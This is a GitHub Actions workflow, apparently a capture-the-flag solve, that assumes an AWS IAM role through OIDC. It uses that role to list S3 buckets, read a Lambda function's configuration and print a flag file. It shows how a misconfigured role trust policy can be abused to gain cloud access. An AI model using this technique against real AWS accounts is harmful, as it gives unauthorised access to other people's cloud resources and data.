name: assume-role
on:
  push:
    branches: [corgi]

permissions:
  id-token: write
  contents: read

jobs:
  assume:
    runs-on: ubuntu-latest
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1
      - run: aws s3 ls s3://codec4f26c862a321ef5 || true
      - run: aws s3 ls s3://site781fe43f26b9eba3 || true
      - run: aws lambda get-function --function-name nslookupv2 || true
      - run: aws lambda get-function-configuration --function-name nslookupv2 || true
      - run: aws s3 cp s3://codec4f26c862a321ef5/flag.txt . && cat flag.txt